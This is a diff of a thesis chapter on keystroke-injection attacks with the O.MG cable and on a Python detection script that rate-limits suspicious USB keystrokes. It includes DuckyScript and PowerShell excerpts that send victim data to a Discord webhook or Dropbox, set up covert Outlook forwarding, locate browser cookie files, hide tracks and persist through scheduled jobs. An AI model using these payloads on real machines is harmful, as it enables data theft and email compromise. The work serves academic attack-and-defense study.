@@ -2,7 +2,7 @@
 
 \section{Attack Implementation} \label{Attack Implementation}
 
-The first part of this chapter will describe the implementation of the payloads as outlined in Section \ref{methodology}. It introduces the reader to the attacker's point of view, which prerequisites their attacks have, what steps they have to take to develop them, and how they can be implemented. 
+The first part of this chapter will describe the implementation of the payloads as outlined in Section \ref{Methodology}. It introduces the reader to the attacker's point of view, which prerequisites their attacks have, what steps they have to take to develop them, and how they can be implemented. The second part elaborates on the implementation of the defense script as introduced in Section \ref{Methodology}
 
 
 \subsection{Prerequisites}
@@ -17,13 +17,13 @@ The payloads presented in this chapter have the following prerequisites:
 
 \subsection{Basics}
 
-Many payloads contain one or more common basic building blocks, namely setting the input language, opening an application (mostly PowerShell), getting admin rights, sending some data or how to close an application to cover up tracks.  \\
+Many payloads contain one or more common basic building blocks, namely setting the input language, opening an application (mostly PowerShell), getting admin rights, sending some data or closing an application to cover up tracks.  \\
 This section will give a short overview over those use cases and how they can be implemented.
 
-\subsubsection{DUCKY\_LANG} \ref{ducky\_lang}
+\subsubsection{DUCKY\_LANG} \label{ducky\_lang}
 
-It is crucial that the layout set in the payload (default US) is the same as the layout language of the victim host. What happens if it isn't can easily be illustrated by switching the input language of one's own computer using Windows Key + Spacebar. The host interprets the input it receives as though it were typed on a keyboard of that input language layout. This means pressing the same key on a keyboard before and after switching the host's input language will not result in the same interpretation. Typing a ``\$''on an ISO-CH layout keyboard will be interpreted as a ``#'' by a host set to ISO-DE input. A payload written on a ISO-CH keyboard to use a ``\$''  will write the wrong character to a ISO-DE host - unless the keyboard language is set as \verb|DUCKY_LANG DE|. 
-For this reason having the right input language set in the payload is vital to its success. If the input language is unknown, the O.MG's keymapper feature can be used to identify it.
+It is crucial that the layout set in the payload (default US) is the same as the layout language of the victim host. What happens if it isn't can easily be illustrated by switching the input language of one's own computer using Windows Key + Spacebar. The host interprets the input it receives as though it were typed on a keyboard of that input language layout. This means pressing the same key on a keyboard before and after switching the host's input language will not result in the same interpretation. Typing a ``\$'' on an ISO-CH layout keyboard will be interpreted as a ``#'' by a host set to ISO-DE input. A payload written on an ISO-CH keyboard injecting a ``\$''  will write the wrong character to an ISO-DE host - unless the keyboard language is set as \verb|DUCKY_LANG DE|. 
+For this reason, having the right input language set in the payload is vital to its success. If the input language is unknown, the O.MG's keymapper feature can be used to identify it.
 
 
 
@@ -84,7 +84,7 @@ ENTER
 
 \subsubsection{Closing applications}
 
-In Windows exists a little menu for every open window. It can be accessed by right-clicking somewhere in the header of the window, or more simply having it focused and pressing the \textit{Alt} and \textit{Space} keys on the keyboard simultaneously. \\
+In Windows, there exists a small dropdown for every open window. It can be accessed by right-clicking somewhere in the header of the window, or more simply having it focused and pressing the \textit{Alt} and \textit{Space} keys on the keyboard simultaneously. \\
 The menu features the options '\textit{\underline{R}estore}', '\textit{\underline{M}ove}', '\textit{\underline{S}ize}', '\textit{Mi\underline{n}imize}', '\textit{Ma\underline{x}imize}', and '\textit{\underline{C}lose}'. The underlined letter in every option marks its shortcut. This can be used to minimize active windows or close them after running a payload to cover one's tracks.
 \begin{lstlisting}[caption={Close a window through its window menu}, captionpos=b]
 ALT SPACE
@@ -107,7 +107,7 @@ STRINGLN exit
 \subsubsection{Sending Recon to a Server}
 
 When gathering some information from the victim's laptop, the question arises of how this information can be forwarded to the attacker. While there is a myriad of possibilities for this, ranging from physical extraction to Bluetooth, to basic IP packets, this thesis will elaborate on two ways to send information from the target to a destination over the internet.
-One option to send out information is to send it to an already-established server. The O.MG repository on GitHub features examples for sending intel to a Dropbox or Discord server, sending via Teams, Email and more. The advantage of sending information over a frequently used communication channel like this is that it looks very inconspicuous and will probably pass through firewalls.\\
+One option to send out information is to send it to an already-established server. The O.MG repository on GitHub features examples of sending intel to a Dropbox or Discord server, sending via Teams, email, and more. The advantage of sending information over a frequently used communication channel like this is that it looks very inconspicuous and will probably pass through firewalls.\\
 
 
 One example of sending an Extensible Markup Language (XML) object to a Discord webhook given the webhook address and the content for the XML object:
@@ -124,7 +124,7 @@ ENTER
 
 This approach would also be possible with a custom server by replacing the webhook with the server address.
 
-Another possibility is to use Dropbox apps. This requires a Dropbox account. Once logegd in to the app concolse, a new app can be created. Before generating the access token, the file.content.write permissions have to be given to ensure that file can actually be uploaded. From there the DuckyScript code looks like this;
+Another possibility is to use Dropbox apps. This requires a Dropbox account. Once logged in to the app console, a new app can be created. Before generating the access token, the ``file.content.write'' permissions have to be given to ensure that the file can be uploaded. From there the DuckyScript code looks like this;
 
 \begin{lstlisting}[caption={Send any file to a Dropbox app}, captionpos=b]
 STRINGLN $accessToken = "<DROPBOX_ACCESS_TOKEN>"
@@ -146,7 +146,7 @@ STRINGLN Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body 
 
 \subsubsection{Register Email Forwarding}
 
-This payload aims to user Outlook to register email forwarding to a foreign Email, it is therefore UI based. \\
+This payload aims to use Outlook to register email forwarding to a foreign Email, it is therefore UI based. \\
 The payload opens Outlook through the Windows search menu, waits a few seconds to let it start up and then navigates to the correct menu. This is a good example of how tricky it can be to use the UI approach; every menu option that is selected prompts a small load delay that has to be factored into the payload. Simply running all the navigation and selection without or with small delays only, can very swiftly derail the attack because the computer simply is not yet ready for the next command. \\
 Once the payload has navigated to the correct menu, it can select the email for which the forwarding should be selected and where the emails should be forwarded. After that, it closes the menu. One important thing to know for this payload is that this action will prompt a little dialogue window in the top right corner when the application is opened for the first time after the settings change, reminding the user of the new forwarding. Therefore, to mask their steps, the attacker should restart Outlook to close the message such that the victim has less chance of discovering the attack. \\
 To illustrate this attack the following lines show some of the navigational steps:
@@ -274,20 +274,15 @@ DELAY 200
 
 A client's default browser can be extracted via PowerShell using only one line:
 \begin{lstlisting}[caption={Exceprt: Find a target's default browser}, captionpos=b]
-STRINGLN Get-ItemProperty -Path 'HKCU: Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' | Select-Object -ExpandProperty ProgId
+STRINGLN $file = ""
+DELAY 100
+STRINGLN if ($defaultBrowserProgId -match 'firefox') {
+DELAY 100
+STRINGLN     $file = "C:\Users\$env:USERNAME\AppData\Roaming\Mozilla\...
 \end{lstlisting}
 
-After that information is sent back to the attacker, they can connect to the cable and remotely trigger the appropriate attack. For example, if the victim's default browser is Firefox, they could start a terminal, navigate to the default directory for Firefox cookies and extract that file.
+After that information is sent back to the attacker, they can connect to the cable and remotely trigger the appropriate attack. For example, if the victim's default browser is Firefox, they could start a terminal, navigate to the default directory for Firefox cookies and extract that file. The same approach can be used for Chrome, the difference is in the file path.
 
-\begin{lstlisting}[caption={move into the directory for Firefox cookies}, captionpos=b]
-STRINGLN cd "C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\umva4gfp.default-release\cookies.sqlite"
-\end{lstlisting}
-
-The same approach can be used for Chrome, the difference is in the file path.
-
-\begin{lstlisting}[caption={move into the directory for Chrome cookies}, captionpos=b]
-STRINGLN cd "C:\Users\maaik\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
-\end{lstlisting}
 
 \subsubsection{Iteratively End Processes}
 
@@ -326,7 +321,7 @@ The program features a while loop, which will keep it running continuously. It a
 
 Windows Processes can be scheduled via PowerShell with admin privileges. As soon as that is achieved, a job trigger can be chosen. There is a wide variety to choose from, such as time intervals in seconds, minutes, days, even weeks, random delays, repetition for a set duration, or events such as logon or start-up \cite{sdwheelerNewJobTriggerPSScheduledJobPowerShell}.
 For this demonstration, logon is used. \\
-Similarly, some job options can also be configured, they can be things like '-ContinueIfGoingOnBattery', -HideInTaskScheduler, -IdleTimeout (how long is the computer idle before the job starts), -RequireNetwork, and many more \cite{sdwheelerSetScheduledJobOptionPSScheduledJobPowerShell}. \\
+Similarly, some job options can also be configured, they can be things like \\ '-ContinueIfGoingOnBattery', -HideInTaskScheduler, -IdleTimeout (how long is the computer idle before the job starts), -RequireNetwork, and many more \cite{sdwheelerSetScheduledJobOptionPSScheduledJobPowerShell}. \\
 After these settings have been defined, the job itself is registered and the PowerShell window can be closed. \\
 
 
@@ -360,7 +355,8 @@ These inputs are checked at the beginning of the script to ensure that all neces
 
 The help message from the script can be seen in Listing \ref{defense_help_message}.
 
-\begin{lstlisting}[caption={Defense Script Help Message },\label={defense_help_message}, captionpos=b]
+
+\begin{lstlisting}[caption={Defense Script Help Message }, label={defense_help_message}, captionpos=b]
 usage: OMG Detection Framework [-h] [-i INTERARRIVAL_TIME] [-t TIME_WINDOW] [-dr] [-de] path_to_usbdeview
 
 This program is designed to detect O.MG devices and attacks. It recognizes the unique O.MG enumeration fingerprint and implements a rate limiter that has two modes.
@@ -423,7 +419,7 @@ class Frame:
         self.isInterfaceDescriptorPacket: bool = False
 \end{lstlisting}
 
-Key attributes of frames include their source and destination, their function (URB\_function), whether they are device descriptor packets or interface descriptor packets, and any HID data they may carry, if available.
+Key attributes of frames include their source and destination, their function \\ (URB\_function), whether they are device descriptor packets or interface descriptor packets, and any HID data they may carry, if available.
 
 
 \subsection{Packet Capturing}
@@ -436,8 +432,8 @@ After this index is acquired, Tshark is run with \verb|tshark -i {index} -V|. Th
 \subsection{Information Extraction}
 
 The output relayed from Tshark is analyzed line by line. The beginning of a frame is marked by a substring matching the pattern \verb|Frame\s\d+:|. With this knowledge, every line after can be stored in the content attribute of the current frame and can be analyzed once the entire frame has been received. \\ 
-All information is extracted from the stream of output lines like this by searching for the keywords that announce the information. After finding a frame line for instance, the program will check the line for the presence of another marker like "[Source:" or "[Destination:". The bmAttributes, which specify the remote wakeup and self-power attributes of a USB device, bString, which is the device's name, HID data (for example which key was pressed) and the function (URB\ Function) of the frame are found in the same way. After their extraction, they are stored in the Frame instance stored under the current\_frame variable. \\
-If the frame is a device or an interface descriptor it is detected through the presence of the respective substring ('DEVICE DESCRIPTOR' or 'INTERFACE DESCRIPTOR'). However, because the information that is stored in these frames is distributed over multiple lines that have not yet arrived by the time the 'INTERFACE DESCRIPTOR' or 'DEVICE DESCRIPTOR'  lines are examined, the frame has to be analyzed again, once all of its content has arrived. So, when a new frame starts, the program first checks whether the previous frame was marked as interface or device descriptor and if that is the case, it will call a helper method to extract the respective information. \\
+All information is extracted from the stream of output lines like this by searching for the keywords that announce the information. After finding a frame line for instance, the program will check the line for the presence of another marker like ``[Source:" or ``[Destination:". The bmAttributes, which specify the remote wakeup and self-power attributes of a USB device, bString, which is the device's name, HID data (for example which key was pressed) and the function (URB\ Function) of the frame are found in the same way. After their extraction, they are stored in the Frame instance stored under the current\_frame variable. \\
+If the frame is a device or an interface descriptor it is detected through the presence of the respective substring (``DEVICE DESCRIPTOR'' or ``INTERFACE DESCRIPTOR''). However, because the information that is stored in these frames is distributed over multiple lines that have not yet arrived by the time the 'INTERFACE DESCRIPTOR' or ``DEVICE DESCRIPTOR''  lines are examined, the frame has to be analyzed again, once all of its content has arrived. So, when a new frame starts, the program first checks whether the previous frame was marked as interface or device descriptor and if that is the case, it will call a helper method to extract the respective information. \\
 Per the definition of the USB protocol \cite{WaybackMachine2018}, a device descriptor frame will be sent before an interface descriptor or any of the other device-specific information like bStrings and bmAttributes. A device descriptor packet therefore triggers a device registration, wherein a new USBDevice instance is created and populated with the device descriptor information, such as the vendor and product ID, the device class and the device protocol. The USBDevice instance is then stored in a device dictionary to make sure it can be accessed again to store and retrieve information. The unique key for every device in this dictionary is the bus and port where it is registered on the host. These are assigned at the very beginning of the enumeration process before any packet-level communication takes place, as described in section \ref{TheUSBProtocol}. Since the host has to have a reliable way to keep all devices apart, no two devices ever share a source. \\
 The same mechanism for information extraction is executed for interface descriptors, except that their source device should already be registered in the dictionary and can be retrieved by the source of the frame. The interface class and interface protocol are extracted from the frame content and added to the USBDevice instance.\\
 Devices also have to be deregistered when they disconnect in order to not mess up the index of connected devices. A disconnect can be detected by the URB function \verb|URB_FUNCTION_ABORT_PIPE|. If it is detected, the source key and USBDevice instance from which it is sent are deleted from the dictionary of registered devices.
@@ -451,7 +447,7 @@ Disabling or disconnecting a USB device is done with the help of the USBDeview u
 \subsection{Rate Limiter}
 
 Every time a key is pressed, a total of four frames are exchanged between the host and the keyboard. The first frame is generated by the keyboard and signals to the device that a key is pressed. This is followed by a message of acknowledgement from the host. The third frame is the key release package signalling that the pressed key was released sent by the keyboard. If the key is pressed continuously, the amount of characters is deducted from the time elapsed time between the keypress package and the release package. The release package can be distinguished from the key press package by the content of its HID data which is not the HID code for any possible input and instead contains 16 zeroes. \\
-These keypress packages are of URB function type \verb|URB_FUNCTION_BULK_OR_INTERRUPT_TRANSFER|. Every time such a package is acquired, the rate limiter method is called. However, packages of this URB function type are also sent during the enumeration process, where they don't signal keyboard input. In order to distinguish those packets, the HID payload for the frames has to be known. Bulk or interrupt transfer packages from the enumeration process do not carry HID data. For this reason, the rate limiter method can only be called once the entire package and its optional HID payload have been received. This puts this check in the same category as the device descriptor and interface frames that are evaluated after the entire frame has been received. When the program detects the start of a new frame following a previous URB function bulk or interrupt frame, it triggers the rate limiter method. \\
+These keypress packages are of URB function type \\ \verb|URB_FUNCTION_BULK_OR_INTERRUPT_TRANSFER|. Every time such a package is acquired, the rate limiter method is called. However, packages of this URB function type are also sent during the enumeration process, where they don't signal keyboard input. In order to distinguish those packets, the HID payload for the frames has to be known. Bulk or interrupt transfer packages from the enumeration process do not carry HID data. For this reason, the rate limiter method can only be called once the entire package and its optional HID payload have been received. This puts this check in the same category as the device descriptor and interface frames that are evaluated after the entire frame has been received. When the program detects the start of a new frame following a previous URB function bulk or interrupt frame, it triggers the rate limiter method. \\
 The rate limiter method first filters out all packages that are sent from the host or any devices that are not registered as a keyboard. Then it ignores all packages that do not carry HID data. Lastly, it will also disregard keypress release packages. After these filters have been applied, the actual rate-limiting mechanism can begin. As discussed in section \ref{Methodology} two main approaches are considered by this thesis. \\
 First, we will look at the number of keystrokes within a time window. The two variable factors for this are the number of keypresses 'n' that will define the threshold and the time 's' over which they are measured. 
 Upon the arrival of a frame that was identified as a keystroke and passed all the previously mentioned filters, a timestamp is recorded. This timestamp is then added to a queue attribute on the USBDevice class, called \verb|registered_keypresses|. Next, the script iterates through the timestamps in that queue and removes all the timestamps that happened before the considered time window: if \emph{timestamp < current time - time window t} it is removed from the queue. If the length of the cleaned queue is above the threshold for keystrokes n, then more than the allowed number of keystrokes were recorded within the time window and the rate limit is exceeded. The \verb|disable_device()| method is called to disconnect the device and make sure the suspected attack is interrupted. The effectiveness of different values for n and s will be discussed in Section \ref{Evaluation}. 
@@ -462,7 +458,7 @@ The other option is to look at the time interarrival time, which is the time tha
 
 
 
-\section{Conclusion}
+\section{Conclusion Implementation}
 
 This chapter discussed the implementation of the architectures introduced in Chapter \ref{Methodology}. First, it described the development of the novel payloads, detailing the approaches to their implementations and their basic repeating components. The second part of the chapter describes the implementation of the counterpart to the first part; the defence script. It described the mechanisms behind the packet analysis and information extraction as well as the detail of the implementation for the two rate-limiting methods; time window analysis and interarrival time analysis. In addition, it explained what external software the script depends on and how it can be used via the command line. The next chapter will assess the effectiveness of the discussed implementations in achieving their goals.   
 
